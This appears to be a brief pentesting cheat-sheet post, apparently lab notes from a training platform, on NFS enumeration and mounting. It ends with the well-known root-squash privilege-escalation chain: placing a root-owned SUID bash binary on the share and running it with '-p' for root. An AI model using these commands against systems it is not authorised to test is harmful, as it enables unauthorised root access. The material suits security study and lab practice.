---
layout: post
title: "nfs"
keywords: "network file system"
---

By using NFS, users and programs can access files on remote systems almost as if they were local files. It does this by mounting all, or a portion of a file system on a server. The portion of the file system that is mounted can be accessed by clients with whatever privileges are assigned to each file.

### Enumeration
```
2049/tcp open nfs syn-ack ttl 63
```

### List NFS shares
```
showmount -e $IP
```

### Mount NFS
```
mkdir /tmp/mount
sudo mount -t nfs $IP:<SHARE> /tmp/mount/ -nolock
ls -al /tmp/mount
```

### Misconfigured Root Squash
```
NFS Access
-> Gain Low Privilege Shell
--> Upload Bash Executable to the NFS share
---> Set SUID Permissions Through NFS
----> Login through SSH
-----> Execute SUID Bit Bash Executable
------> ROOT ACCESS
```
```
cd /tmp/mount
cp ~/Labs/thm/networkservices2/bash .
sudo chown root bash
sudo chmod +s bash
ssh -i id_rsa <USER>@$IP
./bash -p
```